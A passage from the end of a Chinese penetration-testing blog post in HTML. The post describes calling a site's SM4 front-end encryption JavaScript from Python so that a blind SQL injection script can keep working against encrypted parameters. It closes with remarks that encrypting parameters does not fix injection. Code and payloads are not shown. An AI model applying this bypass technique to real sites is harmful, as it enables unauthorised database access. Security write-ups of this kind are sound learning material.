+<p>b. python调用js加密明文内容，对比结果（调用js的代码如图，上面没有了，因此没有粘过来，感觉内容有点啰嗦了）<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png" alt="13-py调用js实现SM4"></p>
+<p>6.如此便不用java介入了，之后的操作就是利用之前的盲注脚本，修改一下data参数的加密获取就行了，重复的盲注过程。</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol>
+<li>实际上现在得web框架中很少这种前端传js的了，但是在很多老企业中还是有部分网站不想重构，这样的例子有很多，第一次开发说出这种修复sql注入的方法时，还很犹豫的回答，还可以注入吧。。。，没想到真的有人这样修复，随着一次一次的治标不治本，自己也在不断探索学习。</li>
+<li>有的时候感觉除非大厂，很多网站如果一抓包看到把参数一起加密了，很有可能是在想隐藏什么漏洞。。。</li>
+<li>还有一个小坑，加密js在JavaScript中需要手动new一个对象，再用py调用对象+方法。</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">0x01 第一次常规测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8SM4%E5%8A%A0%E5%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 第二次参数使用SM4加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%AC%AC%E4%B8%89%E6%AC%A1JS%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E9%9A%90%E8%97%8F%E5%AF%86%E9%92%A5"><span class="toc-number">4.</span> <span class="toc-text">0x03 第三次JS加密混淆隐藏密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&text=一次sm4前端参数加密下的sql盲注"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&is_video=false&description=一次sm4前端参数加密下的sql盲注"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次sm4前端参数加密下的sql盲注&body=Check out this article: http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&name=一次sm4前端参数加密下的sql盲注&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&t=一次sm4前端参数加密下的sql盲注"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2021
+    ninefiger
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
